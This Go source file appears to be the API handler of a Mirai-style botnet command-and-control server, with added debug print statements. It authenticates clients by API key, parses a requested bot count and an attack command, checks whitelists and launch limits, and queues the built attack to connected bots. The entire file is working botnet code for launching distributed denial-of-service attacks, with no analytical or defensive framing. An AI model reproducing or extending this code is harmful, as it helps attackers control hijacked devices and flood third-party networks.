package main

import (
    "net"
    "time"
    "strings"
    "strconv"
    "fmt"
)

type Api struct {
    conn    net.Conn
}

func NewApi(conn net.Conn) *Api {
    return &Api{conn}
}

func (this *Api) Handle() {
    var botCount int
    var apiKeyValid bool
    var userInfo AccountInfo
    fmt.Println("[api]start")
    // Get command
    this.conn.SetDeadline(time.Now().Add(60 * time.Second))
    fmt.Println("[api]SetDeadline")
    cmd, err := this.ReadLine()
    if err != nil {
        this.conn.Write([]byte("ERR|Failed reading line\r\n"))
        return
    }
    fmt.Println("[api]SetDeadline_fin")
    passwordSplit := strings.SplitN(cmd, "|", 2)
    fmt.Println("[api]passwordSplit0:",passwordSplit[0],)
    fmt.Println("[api]passwordSplit1:",passwordSplit[0],)
    fmt.Println("[api]CheckApiCode_start")
    if apiKeyValid, userInfo = database.CheckApiCode(passwordSplit[0]); !apiKeyValid {
        this.conn.Write([]byte("ERR|API code invalid\r\n"))
        return
    }
    fmt.Println("[api]CheckApiCode_fin")
    botCount = userInfo.maxBots
    fmt.Println("[api]botcount:",botCount)
    fmt.Println("[api]passwordSplit",passwordSplit[0],passwordSplit[1])
    cmd = passwordSplit[1]
    fmt.Println("[api]passwordSplit",cmd)
    fmt.Println("[api]44")
    if cmd[0] == '-' {
        fmt.Println("[api]command:-")
        countSplit := strings.SplitN(cmd, " ", 2)
        count := countSplit[0][1:]
        botCount, err = strconv.Atoi(count)
        if err != nil {
            this.conn.Write([]byte("ERR|Failed parsing botcount\r\n"))
            return
        }
        if userInfo.maxBots != -1 && botCount > userInfo.maxBots {
            this.conn.Write([]byte("ERR|Specified bot count over limit\r\n"))
            return
        }
        cmd = countSplit[1]
    }
    fmt.Println("[api]NewAttack start")
    atk, err := NewAttack(cmd, userInfo.admin)
    fmt.Println("[api]NewAttack fin:",err)    
    if err != nil {
        this.conn.Write([]byte("ERR|Failed parsing attack command\r\n"))
        return
    }
    fmt.Println("[api]70") 
    buf, err := atk.Build()
    if err != nil {
        this.conn.Write([]byte("ERR|An unknown error occurred\r\n"))
        return
    }
    fmt.Println("[api]76") 
    if database.ContainsWhitelistedTargets(atk) {
        this.conn.Write([]byte("ERR|Attack targetting whitelisted target\r\n"))
        return
    }
    fmt.Println("[api]81") 
    if can, _ := database.CanLaunchAttack(userInfo.username, atk.Duration, cmd, botCount, 1); !can {
        this.conn.Write([]byte("ERR|Attack cannot be launched\r\n"))
        return
    }
    fmt.Println("[api]86") 
    clientList.QueueBuf(buf, botCount, "")
    this.conn.Write([]byte("OK\r\n"))
    fmt.Println("[api]finish")
}

func (this *Api) ReadLine() (string, error) {
    fmt.Println("[api]ReadLine start")
    buf := make([]byte, 1024)
    bufPos := 0

    for {
        n, err := this.conn.Read(buf[bufPos:bufPos+1])
        if err != nil || n != 1 {
            fmt.Println("[api]ReadLine finish:err")
            return "", err
        }
        if buf[bufPos] == '\r' || buf[bufPos] == '\t' || buf[bufPos] == '\x09' {
            bufPos--
        } else if buf[bufPos] == '\n' || buf[bufPos] == '\x00' {
                fmt.Println("[api]ReadLine finish:/n /00")
            fmt.Println(string(buf[:bufPos]))
            return string(buf[:bufPos]), nil
        }
        bufPos++
    }
    fmt.Println("[api]ReadLine finish")
    fmt.Println(string(buf))
    return string(buf), nil
}
